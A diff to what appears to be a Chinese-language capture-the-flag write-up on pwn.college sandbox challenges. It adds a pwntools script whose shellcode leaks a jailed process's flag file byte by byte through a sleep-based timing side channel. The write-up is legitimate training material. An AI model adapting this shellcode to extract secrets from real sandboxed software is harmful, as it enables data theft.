@@ -303,6 +303,69 @@ int nanosleep(const struct timespec *req, struct timespec *rem);
 //req：指向一个timespec结构体，其结构为
 //rem: 睡眠被中断时用来存储剩下的时间，可以直接填NULL
 ```
+泄露信息的脚本如下:<br>
+```python
+from pwn import *
+import time
+
+#context.log_level = 'debug'
+flag = "pwn.college{"
+for i in range(12,55):
+    for j in range(32,128):
+        p = process(["/challenge/babyjail_level11","/flag"])
+        #print(p.recv())
+        shellcode = """
+            mov rdi, 3
+            lea rsi, [rip+buffer]
+            mov rdx, 0x100
+            mov rax, 0
+            syscall
+
+            xor rdi, rdi
+            xor rsi, rsi
+            mov sil, [rip+buffer+{}]
+            mov dil, {}
+            cmp sil, dil
+            jne end
+
+            lea rdi, [rip+time]
+            mov rsi, 0
+            mov rax, 35
+            syscall
+
+            end:
+            ret
+            buffer:
+            .space 0x100
+            time:
+            .quad 1
+            .quad 100000
+        """
+        shellcode = shellcode.format(i,j)
+        #print(shellcode)
+        shellcode = asm(shellcode,arch="amd64")
+        #print(shellcode)
+        #with open("shellcode.test","wb") as f:
+        #    f.write(shellcode)
+        p.sendline(shellcode)
+        start_time = time.time()
+        p.wait()
+        end_time = time.time()
+        #print(p.recv())
+        p.close()
+        if end_time-start_time >= 1:
+            #print("hit character:"+ chr(j))
+            flag += chr(j)
+            print("index:"+chr(i))
+            print(flag)
+            pause()
+            break
+        else :
+            print("not hit")
+            print(end_time-start_time)
+flag += "}"
+print(flag)
+```
 
 ## 2.2 利用syscall confusion实现逃逸<br>
 细节请看[https://wsxk.github.io/sandboxing/](https://wsxk.github.io/sandboxing/)<br>
